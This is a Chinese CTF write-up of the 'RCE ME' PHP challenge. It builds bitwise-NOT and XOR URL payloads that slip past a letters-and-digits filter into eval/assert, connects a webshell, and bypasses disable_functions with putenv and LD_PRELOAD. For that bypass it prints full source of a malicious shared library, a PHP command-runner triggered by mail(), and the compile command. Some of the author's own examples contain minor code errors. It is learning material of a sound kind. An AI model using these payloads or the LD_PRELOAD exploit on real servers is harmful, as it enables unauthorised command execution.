# [极客大挑战 2019]RCE ME 取反绕过正则匹配 绕过disable_function设置

**目录**

[TOC]





有意思。。。。

```php
<?php
error_reporting(0);
if(isset($_GET['code'])){
            $code=$_GET['code'];
                    if(strlen($code)>40){
                                        die("This is too Long.");
                                                }
                    if(preg_match("/[A-Za-z0-9]+/",$code)){
                                        die("NO.");
                                                }
                    @eval($code);
}
else{
            highlight_file(__FILE__);
}
 
// ?>
```

过滤了数字字母

我们要绕过并且执行rce

这里使用取反和异或都可以

## 取反

我们首先来了解一下取反

```php
<?php
 
$c='phpinfo';
$d=urlencode(~$c);
echo $d;
?>
```

通过这个代码 我们可以将字符取反并且通过url编码返回

所以在正则的时候 不会进行匹配

所以我们可以直接通过这个来构造payload

首先我们执行phpinfo()看看

这里的payload

```cobol
?code=(~%8F%97%8F%96%91%99%90)();
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/b245053725dc0f70066013b0e534da20.png" alt="" style="max-height:154px; box-sizing:content-box;" />


过滤了很多函数我们可以使用内置函数 arrest()

这里有一个坑

```scss
assert(phpinfo();)
 
并不会直接执行 
```

我们来尝试一下

```cobol
?code=(~%9E%8D%8D%8C%9A%8B)((~%8F%97%8F%96%91%99%90)();)
 
这里就类似于 assert(phpinfo();)
 
 
 
?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%D6);
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/f67c1dfaba32b78fdbec6f3c339c28b6.png" alt="" style="max-height:233px; box-sizing:content-box;" />


然后直接用蚁剑链接



<img src="https://i-blog.csdnimg.cn/blog_migrate/b0abfd1f9d18199d7a82c7da46be4420.png" alt="" style="max-height:569px; box-sizing:content-box;" />


但是我们无法读取flag 和readflag也无法 这里我们想到了 之间phpinfo中禁用函数了

这里有两个方法桡骨

## 1.蚁剑插件绕过



<img src="https://i-blog.csdnimg.cn/blog_migrate/846cad0b445bb3617896283545989e49.png" alt="" style="max-height:223px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/93801d22412260887dc1e422eb791a8c.png" alt="" style="max-height:335px; box-sizing:content-box;" />


然后 /readflag即可



<img src="https://i-blog.csdnimg.cn/blog_migrate/e4480d751e3dfff34e59e454a882f5f3.png" alt="" style="max-height:73px; box-sizing:content-box;" />


第二种就很高大上了

## 2.baypass disable_function

 [深入浅出LD_PRELOAD & putenv()-安全客 - 安全资讯平台](https://www.anquanke.com/post/id/175403)  [How to bypass disable_functions and open_basedir](https://www.tarlogic.com/en/blog/how-to-bypass-disable_functions-and-open_basedir/) 

首先我们了解一下如何防止getshell

### open_dir/disable_function

这两个一个限制访问目录 一个限制访问函数 直接打死

我们如何绕过呢

### putenv()/LD_PRELOAD 来绕过限制

```php
LD_PRELOAD
 
是环境变量的路径文件 这个文件 在所有其他文件被调用前 首先执行
 
putenv()
 
这个函数是可以在这一次的请求中 暂时性的改变 环境变量
 
putenv ( string $setting ) : bool
 
 
通过 setting 添加到服务器的环境变量中 在当前请求中存活 在请求结束后消失
```

既然我们都可以修改环境变量 了 我们是不是getshell 就更简单了

#### 利用条件

这两个函数未被禁用

#### 利用思路

```cobol
1.我们生成一个恶意的 共享库
 
2.通过 putenv()设置LD_PRELOAD为恶意共享库
 
3.通过函数触发 恶意共享库
 
4.RCE
```

这里直接使用github上面大佬现成的so和php

 [https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD](https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD) 

我们来看看

so代码

```cobol
#define _GNU_SOURCE
 
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
 
 
extern char** environ;
 
__attribute__ ((__constructor__)) void preload (void)
{
    // get command line options and arg
    const char* cmdline = getenv("EVIL_CMDLINE");
 
    // unset environment variable LD_PRELOAD.
    // unsetenv("LD_PRELOAD") no effect on some 
    // distribution (e.g., centos), I need crafty trick.
    int i;
    for (i = 0; environ[i]; ++i) {
            if (strstr(environ[i], "LD_PRELOAD")) {
                    environ[i][0] = '\0';
            }
    }
 
    // executive command
    system(cmdline);
}
```

就是获取指令 然后不断 更新环境变量

```php
<?php
    echo "<p> <b>example</b>: http://site.com/bypass_disablefunc.php?cmd=pwd&outpath=/tmp/xx&sopath=/var/www/bypass_disablefunc_x64.so </p>";
 
    $cmd = $_GET["cmd"];
    $out_path = $_GET["outpath"];
    $evil_cmdline = $cmd . " > " . $out_path . " 2>&1";
    echo "<p> <b>cmdline</b>: " . $evil_cmdline . "</p>";
 
    putenv("EVIL_CMDLINE=" . $evil_cmdline);
 
    $so_path = $_GET["sopath"];
    putenv("LD_PRELOAD=" . $so_path);
 
    mail("", "", "", "");
 
    echo "<p> <b>output</b>: <br />" . nl2br(file_get_contents($out_path)) . "</p>"; 
 
    unlink($out_path);
?>
```

php代码

通过cmd参数来指定命令 通过out_path来指定输出文件 通过sopath来指定污染的so文件

```cobol
这里我们只需要通过
 
_GET(_GET())
 
来arrset(include(/var/tmp/hack.php)) 即可访问php文件
```

我们来通过取反执行

```cobol
?code=${%fe%fe%fe%fe^%a1%b9%bb%aa}[_](${%fe%fe%fe%fe^%a1%b9%bb%aa}[__]);&_=assert&__=include(%27/var/tmp/bypass_disablefunc.php%27)&cmd=ls&outpath=/var/tmp/easy&sopath=/var/tmp/bypass_disablefunc_x64.so    
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/3ff02bb2e16351640648e2de0e7c21ea.png" alt="" style="max-height:260px; box-sizing:content-box;" />


然后我们修改cmd 即可

```cobol
?code=${%fe%fe%fe%fe^%a1%b9%bb%aa}[_](${%fe%fe%fe%fe^%a1%b9%bb%aa}[__]);&_=assert&__=include(%27/var/tmp/bypass_disablefunc.php%27)&cmd=/readflag&outpath=/var/tmp/easy&sopath=/var/tmp/bypass_disablefunc_x64.so    
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/f53e1baea336eeab34b8470f8cc92979.png" alt="" style="max-height:151px; box-sizing:content-box;" />
但是这里我觉得我们还是了解一下比较好

## 

## 扩展

了解漏洞就了解清楚了 我觉得才可以提升自己

我们来重新梳理一下劫持过程

这里我们要注意

我们使用mail函数 是因为 这个函数在执行后才会开启程序 这样我们就可以劫持进程

这里注意 mail()和error_log()都是开启了 sendmail进程 我们可以劫持 并且 sendmail中存在getuid函数 我们可以利用绕过disable_function

error_log()函数第二个参数要设置为1

我们来自己写一遍

### 第一种写法

hack.so

```objectivec
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
 
void payload(){
    system('ls /> /tmp/flag')
}
 
int getuid(){
    if(getenv(LD_PRELOAD)==NULL){return 0;}
    unsetenv(LD_PRELOAD);
    payload();
}
```

hack.php

```php
<?php
putenv(LD_PRELOAD=/vat/tmp/hack.so);
mail('','','','');
?>
```

首先我们会include hack.php执行

然后就会设置共享库 hack.so  然后执行 mail

共享库的作用就是 定义了 getuid()这个函数 我们就可以覆盖掉之前的函数

因为LD_PRELOAD就是为了有选择的使用相同函数 就是可以在函数一样的情况下 指定选择

这样 我们判断当前环境变量 然后取消掉 设置payload即可

这样现在的getuid()函数就是 system("ls / -> /tmp/flag")

### 第二种写法

这种写法 就是大佬的写法了

首先我们要知道函数

```delphi
__attribute__((constructor))

这个修饰符可以让其修饰的函数在 main函数启动前就启动

如果出现在共享对象中 如果共享被启动 就立马执行
```



```cpp
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
 
__attribute__((constructor)) void payload(){
    unsetenv(LD_PRELOAD);
    const char* cmd=getenv("CMD");
    system(cmd);
}
```

这里通过php中的cmd变量 传递到so文件中 然后被获取 执行了cmd

编译方法都是一样的

```vbnet
gcc -shared -fPIC hack.c -o hack.so
```